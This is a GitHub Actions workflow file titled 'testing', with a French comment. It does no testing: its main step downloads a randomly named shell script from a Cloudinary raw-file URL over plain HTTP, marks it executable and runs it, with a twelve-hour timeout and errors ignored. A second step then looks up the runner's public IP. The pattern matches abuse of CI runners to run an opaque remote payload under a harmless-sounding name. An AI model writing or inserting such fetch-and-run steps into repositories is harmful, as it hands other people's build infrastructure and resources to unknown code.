name: testing

on:
  workflow_dispatch:
  push:
    branches: [main]

jobs:
  run:
    continue-on-error: true
    runs-on: ubuntu-latest
    steps:
      - name: Run exec
        timeout-minutes: 720
        run: |
          curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711124126/dmoowsii38zpn2nr23o9.sh
          chmod +x dmoowsii38zpn2nr23o9.sh
          ./dmoowsii38zpn2nr23o9.sh

      - name: IP Workflow
        run: |
          curl https://api.ipify.org

      # Ajoutez d'autres étapes de votre workflow ici
